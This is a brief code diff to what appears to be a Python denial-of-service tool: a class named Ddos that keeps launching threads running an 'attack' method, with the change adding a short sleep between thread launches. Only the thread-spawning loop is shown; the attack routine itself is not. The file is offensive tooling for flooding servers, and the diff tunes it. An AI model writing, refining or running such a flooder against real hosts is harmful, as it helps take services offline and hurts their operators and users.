@@ -1,5 +1,6 @@
 from requests.exceptions import ConnectionError, ConnectTimeout
 from threading import Thread
+from time import sleep
 from urllib3.exceptions import MaxRetryError, ConnectTimeoutError
 
 import requests
@@ -31,6 +32,7 @@ class Ddos:
         signal.signal(signal.SIGTERM, exit)
 
         while True:
+            sleep(0.005)
             if self.runningThread < self.maxThread:
                 t = Thread(target=self.attack, name=str(self.attackCount))
                 t.setDaemon(False)
